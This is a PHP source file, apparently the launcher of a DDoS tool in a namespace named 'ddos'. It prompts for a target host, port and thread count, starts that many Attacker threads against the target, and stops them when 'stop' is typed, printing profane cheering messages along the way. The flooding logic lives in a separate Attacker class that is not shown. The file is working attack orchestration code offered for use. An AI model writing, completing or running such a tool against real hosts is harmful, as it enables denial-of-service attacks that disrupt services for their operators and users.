<?php
namespace yxmingy\ddos;
require "io_tools.php";
require "Attacker.php";
println("is starting!!!");
println("Eventbody fucking jump!");
println("Input target host: ");
$host = is_ipv4($in=in()) ? $in : gethostbyname($in);
while(true) {
  println("Input target port: ");
  $port = in();
  if(!is_numeric($port)) {
    println("Port must be a valid number!");
  }else {
    break;
  }
}
while(true) {
  println("Input thread number: ");
  $thread = in();
  if(!is_numeric($thread)) {
    println("Thread must be a valid number!");
  }else {
    break;
  }
}
println("Host: ".$host." | Port ".$port);
println("Preparing thread...");
$attackers = [];
for($i=0;$i<$thread;$i++) {
  $attackers[] = new Attacker($host,$port,$i+1);
}
println("Are you ready?");
sleep(1);
println("Go gO GO LeTs go!");
println("We are the fucking ANIMALS!!!");
foreach($attackers as $a) {
  $a->start();
}
usleep(100000);
println("Now, it is being gone.");
while(true) {
  if(in() == "stop") {
    println("OK.Where there is a will, there is a way...");
    foreach($attackers as $a) {
      $a->shutdown();
      $a->join();
    }
  }
}
println('He say "One Day you will leave this world behind, so live a life you will remember."');